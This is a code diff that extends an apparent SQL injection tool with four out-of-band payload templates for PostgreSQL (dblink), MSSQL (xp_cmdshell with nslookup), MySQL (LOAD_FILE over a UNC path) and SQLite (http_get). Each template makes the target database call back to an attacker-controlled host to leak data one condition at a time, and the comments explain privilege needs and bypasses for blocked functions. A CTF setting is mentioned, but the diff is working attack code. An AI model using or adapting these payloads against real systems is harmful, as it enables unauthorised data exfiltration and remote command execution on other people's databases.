@@ -8,7 +8,7 @@ class Profile:
     comment: str
 
     def substring(self, expression: str, pos: int) -> str:
-        if self.name == "mssql":
+        if self.name in ("mssql", "mssql-cmdshell"):
             return f"SUBSTRING(({expression}),{pos},1)"
         if self.name == "oracle-http":
             return f"SUBSTR(({expression}),{pos},1)"
@@ -45,6 +45,28 @@ class Profile:
                 f"COPY (SELECT '') TO PROGRAM 'nslookup {escaped}'; "
                 f"END IF; END $$;--"
             )
+        if self.name == "postgres-dblink":
+            return (
+                f"{base}';SELECT CASE WHEN {condition} THEN "
+                f"dblink_connect('host={callback_host} user=a password=a dbname=a') "
+                f"ELSE NULL END::text--"
+            )
+        if self.name == "mssql-cmdshell":
+            return (
+                f"{base}';IF ({condition}) "
+                f"EXEC master..xp_cmdshell 'nslookup {callback_host}'--"
+            )
+        if self.name == "mysql-stacked":
+            escaped = callback_host.replace("'", "''")
+            return (
+                f"{base}'; SELECT IF({condition},"
+                f"LOAD_FILE('\\\\\\\\{escaped}\\\\x'),NULL);--"
+            )
+        if self.name == "sqlite-http":
+            return (
+                f"{base}' AND CASE WHEN {condition} "
+                f"THEN http_get('http://{callback_host}/') ELSE 0 END--"
+            )
         raise ValueError(f"unknown profile: {self.name}")
 
 
@@ -73,5 +95,25 @@ PROFILES = {
         "postgres-program",
         "PostgreSQL COPY TO PROGRAM callback",
         "Requires stacked queries and high privileges (usually superuser/pg_execute_server_program).",
+    ),
+    "postgres-dblink": Profile(
+        "postgres-dblink",
+        "PostgreSQL dblink extension callback — lower privilege than COPY TO PROGRAM",
+        "Requires dblink extension. No superuser needed in most default Postgres installs.",
+    ),
+    "mssql-cmdshell": Profile(
+        "mssql-cmdshell",
+        "MSSQL xp_cmdshell nslookup callback — alternative when xp_dirtree is blocked",
+        "Requires: EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE.",
+    ),
+    "mysql-stacked": Profile(
+        "mysql-stacked",
+        "MySQL LOAD_FILE via stacked query — for multi-statement enabled targets",
+        "Requires FILE privilege, stacked queries, and Windows-style UNC resolution.",
+    ),
+    "sqlite-http": Profile(
+        "sqlite-http",
+        "SQLite http_get() callback via sqlite-http/sqlean-http extension",
+        "Requires the sqlite-http extension loaded. Common in some CTF challenge deployments.",
     ),
 }
